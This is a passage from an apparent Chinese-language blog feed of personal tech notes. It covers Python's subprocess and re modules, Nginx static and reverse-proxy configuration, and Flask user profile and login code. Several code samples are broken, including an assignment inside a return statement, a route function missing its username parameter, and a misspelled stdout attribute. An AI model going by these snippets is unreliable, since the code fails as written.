        &lt;h1 id=&quot;lnmp环境搭建&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#lnmp环境搭建&quot;&gt;&lt;/a&gt; lnmp环境搭建&lt;/h1&gt;
&lt;h3 id=&quot;下载&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#下载&quot;&gt;&lt;/a&gt; 
      
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
      <category term="Linux" scheme="http://yoursite.com/categories/security/Linux/"/>
    
      <category term="xss" scheme="http://yoursite.com/categories/security/Linux/xss/"/>
    
    
  </entry>
  
  <entry>
    <title>python模块-subprocess</title>
    <link href="http://yoursite.com/2018/06/13/python%E6%A8%A1%E5%9D%97-subprocess/"/>
    <id>http://yoursite.com/2018/06/13/python模块-subprocess/</id>
    <published>2018-06-13T00:31:54.000Z</published>
    <updated>2018-06-13T00:32:54.984Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>subprocess 允许你启动一个新的进程，连接到这个进程的输入，输出，错误的管道中，取得返回的值。用于执行一些系统的命令</p></blockquote><h1 id="代码结构及其实例"><a class="markdownIt-Anchor" href="#代码结构及其实例"></a> 代码结构及其实例</h1><h2 id="run"><a class="markdownIt-Anchor" href="#run"></a> run</h2><blockquote><p>官方推荐其使用 run  方法。这是一个封装好的subprocess方法, 返回一个CompleteProcess 实例</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None)</span><br></pre></td></tr></table></figure><h3 id="代码1"><a class="markdownIt-Anchor" href="#代码1"></a> 代码1：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line"># 运行后不会有输出</span><br><span class="line">a = subprocess.run(&apos;ls -al&apos;,shell=True,stdout=subprocess.PIPE)</span><br><span class="line"># 输出</span><br><span class="line">a.stdout</span><br></pre></td></tr></table></figure><h3 id="代码2"><a class="markdownIt-Anchor" href="#代码2"></a> 代码2：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">b = subprocess.run([&apos;ls&apos;,&apos;-al&apos;],stdout=subprocess.PIPE)</span><br><span class="line">b.stdout</span><br><span class="line">CompleteProcess对象有以下参数：</span><br><span class="line">args: 用于执行的命令，比如 ls -al, [&apos;ls&apos;,&apos;-al&apos;]</span><br><span class="line">returnCode: 退出进程后，返回值</span><br><span class="line">stdout: 命令输出</span><br><span class="line">stderr: 命令错误时输出</span><br></pre></td></tr></table></figure><h1 id="subprocess构造函数"><a class="markdownIt-Anchor" href="#subprocess构造函数"></a> subprocess构造函数</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class subprocess.Popen(args, bufsize=-1, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=True, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0, restore_signals=True, start_new_session=False, pass_fds=(), *, encoding=None, errors=None)</span><br></pre></td></tr></table></figure><h2 id="常见代码1"><a class="markdownIt-Anchor" href="#常见代码1"></a> 常见代码1：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test = subprocess.Popen([&apos;ls&apos;,&apos;-al&apos;],stdout=subprocess.PIPE)</span><br><span class="line"># test.stdout 返回一个&lt;_io.BufferedReader name=3&gt;</span><br><span class="line">test.stdiyt.read()   # 读取输出</span><br><span class="line"></span><br><span class="line">注： 必须要有 stdout=subprocess.PIPE 否则不会有输出。</span><br></pre></td></tr></table></figure><h1 id="与命令交互"><a class="markdownIt-Anchor" href="#与命令交互"></a> 与命令交互：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Popen.communicate(input=None,timeout=None) # (stdout_data,stderr_data)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;subprocess 允许你启动一个新的进程，连接到这个进程的输入，输出，错误的管道中，取得返回的值。用于执行一些系统
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="modules" scheme="http://yoursite.com/categories/python/modules/"/>
    
    
  </entry>
  
  <entry>
    <title>python模块 - re</title>
    <link href="http://yoursite.com/2018/06/13/python%E6%A8%A1%E5%9D%97-re/"/>
    <id>http://yoursite.com/2018/06/13/python模块-re/</id>
    <published>2018-06-13T00:30:57.000Z</published>
    <updated>2018-06-13T00:32:35.724Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>正则表达式是处理字符串的强大的工具，检索字符串，替换，匹配验证等等。</p></blockquote><h1 id="常用的匹配规则"><a class="markdownIt-Anchor" href="#常用的匹配规则"></a> 常用的匹配规则</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">\w 匹配字母，数字和下划线</span><br><span class="line">\d 匹配数字</span><br><span class="line">\s 匹配任何空白字符</span><br><span class="line">\z 匹配字符串结尾，如果有换行符，一起匹配</span><br><span class="line">\n 匹配换行</span><br><span class="line">\t 匹配制表符</span><br><span class="line">^  匹配开头</span><br><span class="line">$  匹配结尾</span><br><span class="line">.  匹配任何字符，除了换行符，除非指定re.DOTALL</span><br></pre></td></tr></table></figure><h1 id="python的re模块"><a class="markdownIt-Anchor" href="#python的re模块"></a> python的re模块</h1><blockquote><p>注： .*? 遇到换行符就不管用了，除非加上re.S</p></blockquote><h2 id="match"><a class="markdownIt-Anchor" href="#match"></a> match</h2><blockquote><p>match 尝试从字符串开头开始匹配正则表达式，如果成功就返回，如果没有就返回一二None</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; a = &quot;Hello World&quot;</span><br><span class="line">&gt;&gt;&gt; b = re.match(&apos;\w+\s&apos;,a,re.S)</span><br><span class="line">&gt;&gt;&gt; b</span><br><span class="line">&lt;_sre.SRE_Match object; span=(0, 6), match=&apos;Hello &apos;&gt;</span><br><span class="line">&gt;&gt;&gt; b.span()</span><br><span class="line">(0, 6)</span><br><span class="line">&gt;&gt;&gt; b.group()</span><br><span class="line">&apos;Hello &apos;</span><br><span class="line">&gt;&gt;&gt; b.group(0)</span><br><span class="line">&apos;Hello &apos;</span><br><span class="line"></span><br><span class="line">None 是false</span><br></pre></td></tr></table></figure><h2 id="search"><a class="markdownIt-Anchor" href="#search"></a> search</h2><blockquote><p>扫描整个字符串，如果符合就返回，否则返回none</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re</span><br><span class="line">&gt;&gt;&gt; a = &quot;Hello World&quot;</span><br><span class="line">&gt;&gt;&gt; c = re.search(&apos;\s\w+&apos;,a)</span><br><span class="line">&gt;&gt;&gt; c</span><br><span class="line">&lt;_sre.SRE_Match object; span=(5, 11), match=&apos; World&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; c.group()</span><br><span class="line">&apos; World&apos;</span><br></pre></td></tr></table></figure><h1 id="findall"><a class="markdownIt-Anchor" href="#findall"></a> findall</h1><blockquote><p>当需要提取全部匹配的内容，需要使用findall，使用search只能取回第一个。如果在匹配的时候用括号指定了，那么返回中的列表就会包含元祖</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d = re.findall(r&apos;He(l)l(o)&apos;,a)</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">[(&apos;l&apos;, &apos;o&apos;)]</span><br></pre></td></tr></table></figure><h1 id="sub"><a class="markdownIt-Anchor" href="#sub"></a> sub</h1><blockquote><p>替换文本,返回替换好的字符串</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.sub(&apos;\s\w+&apos;,&apos;johnw&apos;,a)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;正则表达式是处理字符串的强大的工具，检索字符串，替换，匹配验证等等。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="modules" scheme="http://yoursite.com/categories/python/modules/"/>
    
      <category term="爬虫" scheme="http://yoursite.com/categories/python/modules/%E7%88%AC%E8%99%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux - Nginx</title>
    <link href="http://yoursite.com/2018/06/09/Linux-Nginx/"/>
    <id>http://yoursite.com/2018/06/09/Linux-Nginx/</id>
    <published>2018-06-09T13:22:07.000Z</published>
    <updated>2018-06-14T15:08:07.923Z</updated>
    
    <content type="html"><![CDATA[<h1 id="nginx做为静态服务器和反向代理服务器"><a class="markdownIt-Anchor" href="#nginx做为静态服务器和反向代理服务器"></a> nginx做为静态服务器和反向代理服务器</h1><h2 id="安装nginx"><a class="markdownIt-Anchor" href="#安装nginx"></a> 安装nginx</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 查看nginx版本,内核需要2.6以上</span><br><span class="line">uname -a</span><br><span class="line"></span><br><span class="line">#安装gcc</span><br><span class="line">yum install gcc gcc-c++ pcre-devel zlib zlib-devel openssl openssl-devel</span><br><span class="line"></span><br><span class="line">gcc 编译c</span><br><span class="line">gcc-c++ 编译c++</span><br><span class="line">pcre-devel 解析perl正则</span><br><span class="line">zlib 用于压缩</span><br><span class="line">zlib-devel 用于开发</span><br><span class="line">openssl 用于ssl加密</span><br><span class="line"></span><br><span class="line">#安装nginx</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">#configure配置选项</span><br><span class="line">--prefix=PATH 安装部署后的根目录</span><br><span class="line">--sbin-path 可执行文件的放置路径 基于前面的prefix  &lt;prefix&gt;/sbin/nginx</span><br><span class="line">--conf-path 放置配置文件  &lt;prefix&gt;/conf/nginx.conf</span><br><span class="line">--error-log-path &lt;prefix&gt;/logs/errors.log</span><br></pre></td></tr></table></figure><h2 id="启动nginx"><a class="markdownIt-Anchor" href="#启动nginx"></a> 启动nginx</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./usr/local/sbin/nginx -s stop / reload</span><br><span class="line">                       -c xxx.conf</span><br></pre></td></tr></table></figure><h2 id="将nginx做为静态服务器"><a class="markdownIt-Anchor" href="#将nginx做为静态服务器"></a> 将nginx做为静态服务器</h2><h4 id="case"><a class="markdownIt-Anchor" href="#case"></a> case:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  location ^~ /static&#123;</span><br><span class="line">    alias usr/local/nginx/conf</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="明确root和alias的不同"><a class="markdownIt-Anchor" href="#明确root和alias的不同"></a> 明确root和alias的不同</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># root</span><br><span class="line">location conf &#123;</span><br><span class="line">  root usr/local/nginx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># alias</span><br><span class="line">location conf &#123;</span><br><span class="line">  alias usr/local/nginx/conf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alias 要指定到具体的一层文件夹</span><br><span class="line">root  会根据url来映射文件夹</span><br><span class="line"></span><br><span class="line">比如：</span><br><span class="line">http://www.xxx.com/conf/test.html </span><br><span class="line">alias的处理 匹配location为conf的规则，将配置的文件夹直接返回给用户</span><br><span class="line">root的处理：匹配到location为conf的规则，提取/conf/test.html 拼接到已配置的文件夹下面</span><br></pre></td></tr></table></figure><h2 id="将nginx做为反向代理服务器"><a class="markdownIt-Anchor" href="#将nginx做为反向代理服务器"></a> 将nginx做为反向代理服务器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 在nginx.conf里面的http模块里面加入</span><br><span class="line">include &apos;/usr/local/nginx/conf/nginx2.conf&apos;</span><br><span class="line">vim nginx2.conf</span><br><span class="line"></span><br><span class="line">upstream xxx&#123;</span><br><span class="line">  server 112.11.11.11:8080;</span><br><span class="line">&#125;</span><br><span class="line">server&#123;</span><br><span class="line">  server_name www.xxx.com;</span><br><span class="line">  location / &#123;</span><br><span class="line">    proxy_pass http://xxx;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="如何做好负载均衡"><a class="markdownIt-Anchor" href="#如何做好负载均衡"></a> 如何做好负载均衡？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upstream xxx&#123;</span><br><span class="line">  server 111.111.111.111 weight=5(权重，优先转发);</span><br><span class="line">  server 222.222.222.222 max_fails=3 fail_timeout=30s(失败3次，30s);</span><br><span class="line">  server 333.333.333.333 down(下线);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;nginx做为静态服务器和反向代理服务器&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#nginx做为静态服务器和反向代理服务器&quot;&gt;&lt;/a&gt; nginx做为静态服务器和反向代理服务器&lt;/h1&gt;
&lt;h2 id=&quot;安装nginx&quot;&gt;&lt;a c
      
    
    </summary>
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
      <category term="Nginx" scheme="http://yoursite.com/categories/Linux/Nginx/"/>
    
    
  </entry>
  
  <entry>
    <title>Flask - User Profile</title>
    <link href="http://yoursite.com/2018/06/09/Flask-User-Profile/"/>
    <id>http://yoursite.com/2018/06/09/Flask-User-Profile/</id>
    <published>2018-06-09T13:21:27.000Z</published>
    <updated>2018-06-09T13:21:40.284Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>如何用flask实现用户个人中心和头像</p></blockquote><h1 id="个人中心"><a class="markdownIt-Anchor" href="#个人中心"></a> 个人中心</h1><ol><li>使用名字做为url的一部分来分辨个人中心。注意点（url_for, first_or_404）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/user/&lt;username&gt;&apos;)</span><br><span class="line">def user():</span><br><span class="line">    user = User.query.filter_by(username=username).first_or_404()</span><br><span class="line">    posts = [</span><br><span class="line">        &#123;&apos;author&apos;:user,&apos;body&apos;:&apos;Test Post #1&apos;&#125;,</span><br><span class="line">        &#123;&apos;author&apos;:user,&apos;body&apos;:&apos;Test Post #2&apos;&#125;,</span><br><span class="line">    ]</span><br><span class="line">    return render_template(&apos;user.html&apos;,user=user,posts=posts)</span><br><span class="line">    </span><br><span class="line">#使用&lt;username&gt;做为url的变量来区别用户。还有其他几种方式</span><br><span class="line">&lt;string:username&gt;</span><br><span class="line">&lt;int:user_id&gt;</span><br><span class="line">&lt;any(a,b):page_name&gt; 不是 a 就是 b</span><br><span class="line"></span><br><span class="line">* 注意： 当使用url_for 引用这个地址的时候，要把参数加进去</span><br><span class="line">url_for(&apos;user&apos;,username=username)</span><br></pre></td></tr></table></figure><ol start="2"><li>如何生成头像，并展示和应用于每个用户</li></ol><blockquote><p>通过请求 <a href="https://www.gravatar.com/avatar/" target="_blank" rel="noopener">https://www.gravatar.com/avatar/</a><hash> 就可以请求到一张图片，其中这个hash可以是email或者任意值</hash></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class User(UserMixin,db.Model):</span><br><span class="line">    ...</span><br><span class="line">    def set_avatars(self,size):</span><br><span class="line">        url = &quot;https://www.gravatar.com/avatar/&#123;&#125;?d=identicon&amp;s=&#123;&#125;&quot;.format(md5(self.username.lower().encode(&apos;utf-8&apos;)).hexdigest(),size)</span><br><span class="line">        return url</span><br><span class="line">        </span><br><span class="line"># 在HTML模板里面展示</span><br><span class="line">&lt;img src=&apos;&#123;&#123; current_user.set_avatars(128)&#125;&#125;&apos;&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>对于重复的部分，使用jinja2的子模板</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 对于发表文章这一部分，可能其他的地方也会用到，比如首页。因此我们将这部分独立出来</span><br><span class="line"></span><br><span class="line">_posts.html</span><br><span class="line"></span><br><span class="line"># 使用include，可以实现把子模板包含进来</span><br><span class="line">&#123;% include &quot;_posts.html&quot; %&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>增加两个值，一个最后登录的时间，一个是个性签名</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class User(UserMixin,db.Model):</span><br><span class="line">    ...</span><br><span class="line">    # 增加两个字段</span><br><span class="line">    last_seen = db.Column(db.DateTime,default=datetime.now)</span><br><span class="line">    about_me = db.Column(db.String(140))</span><br><span class="line"></span><br><span class="line"># 如何使用last_seen这个参数？</span><br><span class="line">我们每次用户发送请求过来的时候，我们都去更新这个值</span><br><span class="line"></span><br><span class="line"># 在每个请求之前，需要执行的操作。</span><br><span class="line"># 为什么不用db.session.add ， 是因为  current_user 是flask-login从db里面query出来的。本来就已经在db.session里面了。 </span><br><span class="line">@app.before_request</span><br><span class="line">def before_request():</span><br><span class="line">    if current_user.is_authenticated:</span><br><span class="line">        current_user.last_seen = datetime.now()</span><br><span class="line">        db.session.commit()</span><br></pre></td></tr></table></figure><ol start="5"><li>edit user profile</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/edit_profile&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])</span><br><span class="line">@login_required</span><br><span class="line">def edit_profile():</span><br><span class="line">    form = EditProfileForm()</span><br><span class="line">    if form.validate_on_submit():</span><br><span class="line">        current_user.username = form.username.data</span><br><span class="line">        current_user.about_me = form.about_me.data</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(&apos;Your change have saved.&apos;)</span><br><span class="line">        return redirect(url_for(&apos;user&apos;,username=current_user.username))</span><br><span class="line">    </span><br><span class="line">    form.username.data = current_user.username</span><br><span class="line">    form.about_me.data = current_user.about_me</span><br><span class="line">    return render_template(&apos;profile.html&apos;,form=form)</span><br></pre></td></tr></table></figure><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><blockquote><p>主要遇到的问题，就是flask-migrate 的时候，如果你已经downgrade一次了，一定要把version下面的版本文件给删除，否则会出现版本不是最新的状况。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;如何用flask实现用户个人中心和头像&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;个人中心&quot;&gt;&lt;a clas
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="flask" scheme="http://yoursite.com/categories/python/flask/"/>
    
    
  </entry>
  
  <entry>
    <title>Flask - User login </title>
    <link href="http://yoursite.com/2018/06/09/Flask-User-login/"/>
    <id>http://yoursite.com/2018/06/09/Flask-User-login/</id>
    <published>2018-06-09T13:20:49.000Z</published>
    <updated>2018-06-09T13:21:06.813Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>使用flask 实现登录的功能</p></blockquote><h1 id="用户登录"><a class="markdownIt-Anchor" href="#用户登录"></a> 用户登录</h1><ol><li>用户密码安全</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 用户密码的安全我们使用werkzeug.sercurity来做,增加两个函数</span><br><span class="line">class User(db.Model):</span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    def set_password_hash(self,password):</span><br><span class="line">        return self.password_hash = generate_password_hash(password)</span><br><span class="line">    </span><br><span class="line">    def check_password_hash(self,password):</span><br><span class="line">        return check_password_hash(self.password_hash,password)</span><br><span class="line">        </span><br><span class="line"># 用户的密码安全存储</span><br><span class="line">a. 用户密码原始值 + 随机字符</span><br><span class="line">b. hash256</span><br><span class="line">c. hash值 + 随机字符</span><br><span class="line">d. 存入数据库</span><br><span class="line"></span><br><span class="line"># 校验用户密码安全</span><br><span class="line">a. 取出hash值,截取随机字符</span><br><span class="line">b. 接受用户输入的密码 + 截取的随机字符</span><br><span class="line">c. 使用相同的hash函数进行hash</span><br><span class="line">d. 将得到的hash值与数据库的hash值进行比较</span><br></pre></td></tr></table></figure><ol start="2"><li>安装flask-login</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask-login</span><br></pre></td></tr></table></figure><ol start="3"><li>flask-login 介绍</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># flask-login 是flask的插件，用于登录用户，管理用户session，登出用户等等。</span><br><span class="line"></span><br><span class="line"># 一共有四种属性</span><br><span class="line">is_authenticated： 如果用户已经认证了</span><br><span class="line">is_active： 如果用户是已经激活的状态，也可以认为是认证了</span><br><span class="line">is_anonymous： 未登录的状态</span><br><span class="line">get_id()：将用户id做为一个字符返回</span><br><span class="line"></span><br><span class="line"># 使用步骤</span><br><span class="line">a. 在app/__init__.py 中初始化flask-login 并且指定哪个view 函数来做为登录处理函数</span><br><span class="line"></span><br><span class="line">##### 引入登录管理函数</span><br><span class="line">login_manager = LoginManager(app)</span><br><span class="line">login_manager.session_protection = &quot;strong&quot;</span><br><span class="line">##### 如果登录函数是在蓝图中的话，可以使用例如 main.login 这样的方式</span><br><span class="line">login_manager.login_view = &apos;login&apos;</span><br><span class="line"></span><br><span class="line">b. 在 models.py 里面指定哪个为用户的数据库表对象，然后通过user_id 来管理和追踪用户的session</span><br><span class="line"></span><br><span class="line">from flask_login import UserMixin</span><br><span class="line">class User(UserMixin,db.Model):</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">c. 通过user id来管理会话</span><br><span class="line">@login_manager.user_loader</span><br><span class="line">def load_user(id):</span><br><span class="line">    #### 经过flask-login处理 id 已经是字符了，所以要加int，类型转换</span><br><span class="line">    return User.query.get(int(id))</span><br><span class="line"></span><br><span class="line">d. 通过login_user 来登录用户</span><br><span class="line">e. 通过logout_user 来注销用户</span><br><span class="line">f. 通过 @login_required 包装函数来保护登录的链接</span><br></pre></td></tr></table></figure><ol start="4"><li>用户登录逻辑</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 结合上面陈述，代码如下</span><br><span class="line">@app.route(&apos;/login&apos;,methods=[&apos;GET&apos;,&quot;POST&quot;])</span><br><span class="line">def login():</span><br><span class="line">    if current_user.is_authenticated:</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    # 处理表单验证的逻辑</span><br><span class="line">    if form.validate_on_submit():</span><br><span class="line">        # 存储提示信息，可以使用get_flashed_messages 